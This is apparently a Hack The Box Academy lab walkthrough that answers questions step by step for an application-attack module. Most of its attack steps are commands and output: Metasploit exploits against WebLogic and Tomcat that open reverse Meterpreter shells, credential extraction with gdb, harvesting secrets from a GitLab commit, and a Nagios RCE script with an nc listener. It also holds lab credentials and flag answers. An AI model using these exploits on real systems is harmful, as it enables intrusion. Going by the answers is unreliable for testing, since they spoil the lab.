### "After bypassing the login, what is the website "Powered by"?"

After spawning the target machine, students need to navigate to its website's root webpage:

![Attacking_Common_Applications_Walkthrough_Image_100.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_100.png)

Then, students need to input `*` as both the username and password and press Login. Having bypassed the login form, students can see the page is powered by `w3.css`:

![Attacking_Common_Applications_Walkthrough_Image_101.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_101.png)

Answer: `w3.css`

# Web Mass Assignment Vulnerabilities

## Question 1

### "We placed the source code of the application we just covered at /opt/asset-manager/app.py inside this exercise's target, but we changed the crucial parameter's name. SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application."

After spawning the target machine, students need to use SCP to copy the file `app.py` using the credentials `root:!x4;EW[ZLwmDx?=w`, and then analyze the source code with `VS Code`:

Code: shell

```shell
scp root@STMIP:/opt/asset-manager/app.py .
code app.py &
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac-594497@htb-llk3gi0m2q]─[~]
└──╼ [★]$ scp root@10.129.205.15:/opt/asset-manager/app.py .

The authenticity of host '10.129.205.15 (10.129.205.15)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.205.15' (ECDSA) to the list of known hosts.
root@10.129.205.15's password: 
app.py                                                                                                                                      100% 2066   178.8KB/s   00:00    
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac-594497@htb-llk3gi0m2q]─[~]
└──╼ [★]$ code app.py &
[1] 13235
```

Students need to open it with VSCode; inspecting the code, students will find the `active` parameter, which can be manipulated to bypass the login:

![Attacking_Common_Applications_Walkthrough_Image_102.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_102.png)

Answer: `active`

# Attacking Applications Connecting to Services

## Question 1

### "What credentials were found for the local database instance while debugging the octopus_checker binary? (Format username:password)"

Students need to first connect to the target as `htb-student:HTB_@cademy_stdnt!` using SSH:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac-594497@htb-llk3gi0m2q]─[~]
└──╼ [★]$ ssh htb-student@10.129.205.20

The authenticity of host '10.129.205.20 (10.129.205.20)' can't be established.
ECDSA key fingerprint is SHA256:YTRJC++A+0ww97kJGc5DWAsnI9iusyCE4Nt9fomhxdA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.205.20' (ECDSA) to the list of known hosts.
htb-student@10.129.205.20's password: 
<SNIP>
htb-student@htb:~$ 
```

Then, students need to use `gdb` to debug the `octopus_checker` binary:

Code: shell

```shell
gdb ./octopus_checker
```

```shell-session
htb-student@htb:~$ gdb ./octopus_checker 

GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./octopus_checker...
(No debugging symbols found in ./octopus_checker)
gdb-peda$ 
```

The `disassembly-flavor` command can be used to define the display style of the code prior to disassembling:

Code: shell

```shell
set disassembly-flavor intel
disas main
```

```shell-session
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000001456 <+0>:	endbr64 
   0x000000000000145a <+4>:	push   rbp
   0x000000000000145b <+5>:	mov    rbp,rsp
   0x000000000000145e <+8>:	push   rbx
   0x000000000000145f <+9>:	sub    rsp,0x4b8
   0x0000000000001466 <+16>:	mov    rax,QWORD PTR fs:0x28
   0x000000000000146f <+25>:	mov    QWORD PTR [rbp-0x18],rax
   0x0000000000001473 <+29>:	xor    eax,eax
   0x0000000000001475 <+31>:	lea    rsi,[rip+0xbe5]        # 0x2061
   0x000000000000147c <+38>:	lea    rdi,[rip+0x2bbd]        # 0x4040 <_ZSt4cout@@GLIBCXX_3.4>
   0x0000000000001483 <+45>:	call   0x11a0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x0000000000001488 <+50>:	mov    rdx,rax
   0x000000000000148b <+53>:	mov    rax,QWORD PTR [rip+0x2b3e]        # 0x3fd0
   0x0000000000001492 <+60>:	mov    rsi,rax
   0x0000000000001495 <+63>:	mov    rdi,rdx
   0x0000000000001498 <+66>:	call   0x11c0 <_ZNSolsEPFRSoS_E@plt>
   0x000000000000149d <+71>:	lea    rax,[rbp-0x4b0]
   0x00000000000014a4 <+78>:	mov    rdx,rax
   0x00000000000014a7 <+81>:	mov    esi,0x0
   0x00000000000014ac <+86>:	mov    edi,0x1
   0x00000000000014b1 <+91>:	call   0x1170 <SQLAllocHandle@plt>
   0x00000000000014b6 <+96>:	mov    rax,QWORD PTR [rbp-0x4b0]
   0x00000000000014bd <+103>:	mov    ecx,0x0
   0x00000000000014c2 <+108>:	mov    edx,0x3
   0x00000000000014c7 <+113>:	mov    esi,0xc8
   0x00000000000014cc <+118>:	mov    rdi,rax
   0x00000000000014cf <+121>:	call   0x1230 <SQLSetEnvAttr@plt>
   0x00000000000014d4 <+126>:	mov    rax,QWORD PTR [rbp-0x4b0]
   0x00000000000014db <+133>:	lea    rdx,[rbp-0x4a8]
   0x00000000000014e2 <+140>:	mov    rsi,rax
   0x00000000000014e5 <+143>:	mov    edi,0x2
   0x00000000000014ea <+148>:	call   0x1170 <SQLAllocHandle@plt>
--Type <RET> for more, q to quit, c to continue without paging--

```

Students need to press Return to continue debugging the binary, until they find the call to `SQLDriverConnect`:

```shell-session
   0x00000000000015f7 <+417>:	mov    r8,rsi
   0x00000000000015fa <+420>:	mov    ecx,0xfffffffd
   0x00000000000015ff <+425>:	mov    esi,0x0
   0x0000000000001604 <+430>:	mov    rdi,rax
   0x0000000000001607 <+433>:	call   0x11b0 <SQLDriverConnect@plt>
   0x000000000000160c <+438>:	add    rsp,0x10
```

Upon finding the call to `SQLDriverConnect`, students need to set the breakpoint and run it again. Note that setting the breakpoint directly on the Procedure Linkage Table will produce an error. Therefore, students need to set the breakpoint on the function. In the output, students will find the credentials `SA:N0tS3cr3t!`:

Code: shell

```shell
b SQLDriverConnect
run
```

```shell-session
gdb-peda$ b SQLDriverConnect

Breakpoint 1 at 0x11b0

gdb-peda$ run

Starting program: /home/htb-student/octopus_checker 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Program had started..
Attempting Connection 
[----------------------------------registers-----------------------------------]
RAX: 0x55555556c4f0 --> 0x4b5a ('ZK')
RBX: 0x5555555557d0 (<__libc_csu_init>:	endbr64)
RCX: 0xfffffffd 
RDX: 0x7fffffffde40 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;")
RSI: 0x0 
RDI: 0x55555556c4f0 --> 0x4b5a ('ZK')
RBP: 0x7fffffffe2c0 --> 0x0 
RSP: 0x7fffffffdde8 --> 0x55555555560c (<main+438>:	add    rsp,0x10)
RIP: 0x7ffff7d61c20 (<SQLDriverConnect>:	push   r15)
R8 : 0x7fffffffdea0 --> 0x7ffff7d4b008 --> 0x7ffff7d45458 --> 0x7ffff7c9f7c0 (<_ZTv0_n24_NSt13basic_ostreamIwSt11char_traitsIwEED1Ev>:	endbr64)
R9 : 0x400 
R10: 0xfffffffffffff8ff 
R11: 0x246 
R12: 0x555555555240 (<_start>:	endbr64)
R13: 0x7fffffffe3b0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7d61c15 <__handle_attr_extensions_cs+149>:	pop    rbp
   0x7ffff7d61c16 <__handle_attr_extensions_cs+150>:	ret    
   0x7ffff7d61c17:	nop    WORD PTR [rax+rax*1+0x0]
=> 0x7ffff7d61c20 <SQLDriverConnect>:	push   r15
   0x7ffff7d61c22 <SQLDriverConnect+2>:	push   r14
   0x7ffff7d61c24 <SQLDriverConnect+4>:	mov    r14d,ecx
   0x7ffff7d61c27 <SQLDriverConnect+7>:	push   r13
   0x7ffff7d61c29 <SQLDriverConnect+9>:	mov    r13,r8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdde8 --> 0x55555555560c (<main+438>:	add    rsp,0x10)
0008| 0x7fffffffddf0 --> 0x7fffffffde0a --> 0xb3b000007ffff7fe 
0016| 0x7fffffffddf8 --> 0x0 
0024| 0x7fffffffde00 --> 0x7ffff7d45418 --> 0x8 
0032| 0x7fffffffde08 --> 0x7ffff7fe0197 (<_dl_fixup+215>:	mov    r8,rax)
0040| 0x7fffffffde10 --> 0x55555556b3b0 --> 0x4b59 ('YK')
0048| 0x7fffffffde18 --> 0x55555556c4f0 --> 0x4b5a ('ZK')
0056| 0x7fffffffde20 --> 0x7ffff7d4b000 --> 0x7ffff7d45430 --> 0x7ffff7c9f790 (<_ZNSt13basic_ostreamIwSt11char_traitsIwEED1Ev>:	endbr64)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, SQLDriverConnect (hdbc=0x55555556c4f0, hwnd=0x0, 
    conn_str_in=0x7fffffffde40 "DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;", len_conn_str_in=0xfffd, 
    conn_str_out=0x7fffffffdea0 "\b\260\324\367\377\177", conn_str_out_max=0x400, ptr_conn_str_out=0x7fffffffde0a, driver_completion=0x0) at SQLDriverConnect.c:686
686	SQLDriverConnect.c: No such file or directory.
```

Answer: `SA:N0tS3cr3t!`

# Other Notable Applications

## Question 1

### "Enumerate the target host and identify the running application. What application is running?"

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-xk6dxgmeci]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.102

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 09:20 BST
Nmap scan report for 10.129.201.102
Host is up (0.075s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION

<SNIP>

7001/tcp open  http          Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)
|_http-title: Error 404--Not Found
|_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.3)
```

From the output, the only running application that was listed in the module section's reading under the subsection "Honorable Mentions" is `WebLogic`:

![Attacking_Common_Applications_Walkthrough_Image_103.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_103.png)

Answer: `WebLogic`

# Other Notable Applications

## Question 2

### "Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop."

After spawning the target machine, students first need to launch `msfconsole`:

Code: shell

```shell
msfconsole -q
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-xk6dxgmeci]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >>
```

Students then need to use the module `/multi/http/weblogic_admin_handle_rce` and set its options accordingly:

Code: shell

```shell
use /multi/http/weblogic_admin_handle_rce
set RHOSTS STMIP
set SRVHOST PWNIP
set LHOST PWNIP
```

```shell-session
[msf](Jobs:0 Agents:0) >> use /multi/http/weblogic_admin_handle_rce

[*] Using configured payload windows/x64/meterpreter/reverse_https
[msf](Jobs:0 Agents:10) exploit(multi/http/weblogic_admin_handle_rce) >> set RHOSTS 10.129.201.102
RHOSTS => 10.129.201.102
[msf](Jobs:0 Agents:10) exploit(multi/http/weblogic_admin_handle_rce) >> set SRVHOST 10.10.14.169
SRVHOST => 10.10.14.169
[msf](Jobs:0 Agents:10) exploit(multi/http/weblogic_admin_handle_rce) >> set LHOST 10.10.14.169
LHOST => 10.10.14.169
```

At last, students need to run the module/exploit using the `exploit` command:

Code: shell

```shell
exploit
```

```shell-session
[msf](Jobs:0 Agents:10) exploit(multi/http/weblogic_admin_handle_rce) >> exploit

[*] Started HTTPS reverse handler on https://10.10.14.169:8443
[*] Running automatic check ("set AutoCheck false" to disable)
[!] https://10.10.14.169:8443 handling request from 10.129.201.102; (UUID: ebuvhzjk) Without a database connected that payload UUID tracking will not work!
[*] https://10.10.14.169:8443 handling request from 10.129.201.102; (UUID: ebuvhzjk) Attaching orphaned/stageless session...
[!] https://10.10.14.169:8443 handling request from 10.129.201.102; (UUID: ebuvhzjk) Without a database connected that payload UUID tracking will not work!
[+] The target is vulnerable. Path traversal successful.
[*] Executing PowerShell Stager for windows/x64/meterpreter/reverse_https
[*] Meterpreter session 13 opened (10.10.14.169:8443 -> 127.0.0.1) at 2022-10-28 09:39:31 +0100

(Meterpreter 13)(C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain) >
```

Once the `Meterpreter` session has been established, students at last need to print the flag file "flag.txt", which is under the `C:\Users\Administrator\Desktop\` directory, however, since this is a `Meterpreter` session and not a Windows command prompt, directories are specified using back-slash instead of forward-slash:

Code: shell

```shell
type C:/Users/Administrator/Desktop/flag.txt
```

```shell-session
(Meterpreter 13)(C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain) > cat C:/Users/Administrator/Desktop/flag.txt

w3b_l0gic_RCE!
```

Answer: `w3b_l0gic_RCE!`

# Attacking Common Applications - Skills Assessment I

## Question 1

### "What vulnerable application is running?"

After spawning the target machine, students need to launch an `Nmap` scan against it, finding many open services and applications. The one that stands out is the `Tomcat/9.0.0.M1` application, as all `Tomcat` applications with a version prior to `9.0.17` installed on Windows [suffer from a remote code execution vulnerability due to a bug in the way the Java Runtime Environment passes command line arguments to Windows](https://github.com/advisories/GHSA-8vmx-qmch-mpqg):

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8r9tepdgdt]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.89

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 03:25 GMT
Nmap scan report for 10.129.201.89
Host is up (0.047s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

Answer: `Tomcat`

# Attacking Common Applications - Skills Assessment I

## Question 2

### "What port is this application running on?"

From the output of the `Nmap` scan launched previously, students will know that the `Tomcat` application is running on port `8080`:

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8r9tepdgdt]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.89

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 03:25 GMT
Nmap scan report for 10.129.201.89
Host is up (0.047s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

Answer: `8080`

# Attacking Common Applications - Skills Assessment I

## Question 3

### "What version of the application is in use? "

From the output of the `Nmap` scan launched previously, students will know that the version of the `Tomcat` application is `9.0.0.M1`:

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8r9tepdgdt]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.89

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 03:25 GMT
Nmap scan report for 10.129.201.89
Host is up (0.047s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

Answer: `9.0.0.M1`

# Attacking Common Applications - Skills Assessment I

## Question 4

### "Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop."

From the previous questions, students know that the `Tomcat` application running on the target machine suffers from [CVE-2019-0232](https://github.com/advisories/GHSA-8vmx-qmch-mpqg), therefore, before utilizing `msfconsole`, they need to first fuzz the `cgi` servlet for a `.bat` file; `Gobuster` will be used:

Code: shell

```shell
gobuster dir -u http://STMIP:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.201.89:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q

/cmd.bat              (Status: 200) [Size: 0]
/Cmd.bat              (Status: 200) [Size: 0]
```

Now that students have attained the batch file name, they need to launch `msfconsole` and then use the module `exploit/windows/http/tomcat_cgi_cmdlineargs`:

Code: shell

```shell
msfconsole -q
use exploit/windows/http/tomcat_cgi_cmdlineargs
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use exploit/windows/http/tomcat_cgi_cmdlineargs
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Subsequently, students need to set the options of the module accordingly (`FORCEEXPLOIT` needs to be set to `true`) and run the exploit:

Code: shell

```shell
set RHOSTS STMIP
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true
exploit
```

```shell-session
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set RHOSTS 10.129.201.89

RHOSTS => 10.129.201.89
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set TARGETURI /cgi/cmd.bat
TARGETURI => /cgi/cmd.bat
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set FORCEEXPLOIT true
FORCEEXPLOIT => true
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> exploit

[*] Started reverse TCP handler on 10.10.14.45:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress -  13.91% done (13998/100668 bytes)
[*] Command Stager progress -  20.86% done (20997/100668 bytes)
[*] Command Stager progress -  27.81% done (27996/100668 bytes)
[*] Command Stager progress -  34.76% done (34995/100668 bytes)
[*] Command Stager progress -  41.72% done (41994/100668 bytes)
[*] Command Stager progress -  48.67% done (48993/100668 bytes)
[*] Command Stager progress -  55.62% done (55992/100668 bytes)
[*] Command Stager progress -  62.57% done (62991/100668 bytes)
[*] Command Stager progress -  69.53% done (69990/100668 bytes)
[*] Command Stager progress -  76.48% done (76989/100668 bytes)
[*] Command Stager progress -  83.43% done (83988/100668 bytes)
[*] Command Stager progress -  90.38% done (90987/100668 bytes)
[*] Command Stager progress -  97.34% done (97986/100668 bytes)
[*] Sending stage (175686 bytes) to 10.129.201.89
[*] Command Stager progress - 100.02% done (100692/100668 bytes)
[!] Make sure to manually cleanup the exe generated by the exploit
[*] Meterpreter session 1 opened (10.10.14.45:4444 -> 10.129.201.89:49688) at 2022-11-27 08:36:44 +0000

(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) >
```

At last, students need to print out the contents of the flag file "flag.txt", which is under the directory `C:\Users\Administrator\Desktop\`:

Code: shell

```shell
cat C:/Users/Administrator/Desktop/flag.txt
```

```shell-session
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) > cat C:/Users/Administrator/Desktop/flag.txt

f55763d31a8f63ec935abd07aee5d3d0
```

Alternatively, students can also drop into a system shell (using the `meterpreter` command `shell`) and then use `type` on the flag file.

Answer: `f55763d31a8f63ec935abd07aee5d3d0`

# Attacking Common Applications - Skills Assessment II

## Question 1

### "What is the URL of the WordPress instance?"

After spawning the target machine, students need to add the vHost entry `STMIP inlanefrieght.local` to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.201.90 inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to perform vHost fuzzing, finding three vHosts, `monitoring.inlanefreight.local`, `blog.inlanefreight.local`, and `gitlab.inlanefreight.local`:

Code: shell

```shell
gobuster vhost -u inlanefreight.local -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q --append-domain
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ gobuster vhost -u inlanefreight.local -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q --append-domain

Found: blog.inlanefreight.local Status: 200 [Size: 50119]
Found: monitoring.inlanefreight.local Status: 302 [Size: 27] [--> http://monitoring.inlanefreight.local/nagiosxi/login.php?redirect=/index.php%3f&noauth=1]
Found: gitlab.inlanefreight.local Status: 301 [Size: 339] [--> http://gitlab.inlanefreight.local:8180/] 
```

Students then need to add the three entries to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.201.90 monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
```

Visiting `blog.inlanefreight.local`, students will notice that it runs `WordPress`:

![Attacking_Common_Applications_Walkthrough_Image_104.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_104.png)

Students can also view the page's source and view the meta tag named `generator`. Therefore, the URL of the `WordPress` instance is `http://blog.inlanefreight.local`.:

![Attacking_Common_Applications_Walkthrough_Image_105.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_105.png)

Answer: `http://blog.inlanefreight.local`

# Attacking Common Applications - Skills Assessment II

## Question 2

### "What is the name of the public GitLab project?"

From the previous question, students have added the vHost `gitlab.inlanefreight.local` entry into `/etc/hosts`, therefore, they need to visit it and click on `Register now`:

![Attacking_Common_Applications_Walkthrough_Image_106.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_106.png)

![Attacking_Common_Applications_Walkthrough_Image_107.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_107.png)

![Attacking_Common_Applications_Walkthrough_Image_108.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_108.png)

Subsequently, when viewing `Explore projects`, students will that the name of the public `GitLab` project is `Virtualhost`:

![Attacking_Common_Applications_Walkthrough_Image_109.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_109.png)

![Attacking_Common_Applications_Walkthrough_Image_110.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_110.png)

Answer: `Virtualhost`

# Attacking Common Applications - Skills Assessment II

## Question 3

### "What is the FQDN of the third vhost?"

From the vHost fuzzing performed using `Gobuster` on `inlanefreight.local` in the first question, students will know that the Fully Qualified Domain Name of the third vHost is `monitoring.inlanefreight.local`:

Code: shell

```shell
gobuster vhost -u inlanefreight.local -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ gobuster vhost -u inlanefreight.local -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q

Found: monitoring.inlanefreight.local (Status: 302) [Size: 27]
Found: blog.inlanefreight.local (Status: 200) [Size: 50119]   
Found: gitlab.inlanefreight.local (Status: 301) [Size: 339] 
```

Answer: `monitoring.inlanefreight.local`

# Attacking Common Applications - Skills Assessment II

## Question 4

### "What application is running on this third vhost? (One word)"

Students know that the URL of the third vHost is `http://monitoring.inlanefreight.local`, therefore when visiting it, they will find that it is running `Nagios`:

![Attacking_Common_Applications_Walkthrough_Image_111.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_111.png)

Answer: `Nagios`

# Attacking Common Applications - Skills Assessment II

## Question 5

### "What is the admin password to access this application?"

Using the same `GitLab` account created previously, students need to navigate to `http://gitlab.inlanefreight.local:8180/explore` and click on the `Nagios Postgresql` project:

![Attacking_Common_Applications_Walkthrough_Image_112.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_112.png)

Students will notice that latest commit message mentions updating `INSTALL` with "master password", thus, they need to click on it:

![Attacking_Common_Applications_Walkthrough_Image_113.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_113.png)

Within the commit, students will find the exposed credentials `nagiosadmin:oilaKglm7M09@CPL&^lC`:

![Attacking_Common_Applications_Walkthrough_Image_114.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_114.png)

Answer: `oilaKglm7M09@CPL&^lC`

# Attacking Common Applications - Skills Assessment II

## Question 6

### "Obtain reverse shell access on the target and submit the contents of the flag.txt file."

First, students need to navigate to `http://monitoring.inlanefreight.local` and sign in with the previously attained credentials `nagiosadmin:oilaKglm7M09@CPL&^lC`:

![Attacking_Common_Applications_Walkthrough_Image_115.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_115.png)

At the left-most bottom corner, students will find that the `Nagios XI` version is `5.7.5`:

![Attacking_Common_Applications_Walkthrough_Image_116.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_116.png)

Searching for `nagios 5.7` exploits using `searchsploit`, students will find the Python script `49422.py` for an authenticated RCE:

Code: shell

```shell
searchsploit nagios 5.7
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ searchsploit nagios 5.7
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Nagios XI 5.7.3 - 'Contact Templates' Persistent Cross-Site Scripting                              | php/webapps/48893.txt
Nagios XI 5.7.3 - 'Manage Users' Authenticated SQL Injection                                       | php/webapps/48894.txt
Nagios XI 5.7.3 - 'mibs.php' Remote Command Injection (Authenticated)                              | php/webapps/48959.py
Nagios XI 5.7.3 - 'SNMP Trap Interface' Authenticated SQL Injection                                | php/webapps/48895.txt
Nagios XI 5.7.5 - Multiple Persistent Cross-Site Scripting                                         | php/webapps/49449.txt
Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)                                        | php/webapps/49422.py
--------------------------------------------------------------------------------------------------- ---------------------------------
```

Students need to mirror/copy the exploit script:

Code: shell

```shell
searchsploit -m php/webapps/49422.py
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ searchsploit -m php/webapps/49422.py

  Exploit: Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)
      URL: https://www.exploit-db.com/exploits/49422
     Path: /usr/share/exploitdb/exploits/php/webapps/49422.py
File Type: Python script, ASCII text executable

Copied to: /home/htb-ac413848/49422.py
```

Subsequently, students need to start an `nc` listener in the same terminal tab and background it (attaining a job ):

```shell
nc -nvlp PWNPO &
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ nc -nvlp 9001 &

[9] 19933
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Then, students need to run and background the exploit to attain a reverse shell:

```shell
python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' STMIP STMPO &
```

```shell-session
